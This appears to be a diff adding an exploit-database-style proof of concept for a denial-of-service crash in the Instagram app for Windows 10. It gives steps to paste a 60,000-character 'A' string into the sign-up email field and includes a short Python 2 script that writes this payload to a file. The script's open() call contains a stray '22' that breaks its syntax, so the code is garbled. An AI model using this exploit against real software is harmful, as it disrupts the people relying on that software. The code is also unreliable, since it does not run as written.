@@ -1,0 +1,28 @@
+# Exploit Title: Instagram App 41.1788.50991.0 - Denial of Service (PoC)
+# Exploit Author : Ali Alipour
+# Date: 2018-08-25
+# Vendor Homepage : https://www.instagram.com/
+# Software Link Download : https://www.microsoft.com/en-us/p/instagram/9nblggh5l9xt?ocid=blitz_windowsblog&activetab=pivot%3aoverviewtab
+# About : https://blogs.windows.com/windowsexperience/2016/10/13/instagram-app-for-windows-10-expands-to-pc-and-tablets/#SKp37OKfVaj7FRee.97
+# Tested on : Windows 10 - 64-bit
+
+# Steps to Reproduce
+# Run the python exploit script, it will create a new 
+# file with the name "Instagram.txt" just copy the text inside "Instagram.txt"
+# and start the Instagram App - In Microsoft Windows 10 . 
+# In The New Window Click " Sign Up With Phone Or Email " And Select Email Tab. 
+# Now Paste The Content Of "Instagram.txt" Into The Field: " Email Address ". 
+# Click "Next" And You Will See a [ Boom !!!! ] - Instagram App - In Microsoft Windows 10 Crash.
+
+#!/usr/bin/python
+    
+buffer = "A" * 60000
+payload = buffer
+try:
+    f=open("Instagram.txt",22"w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
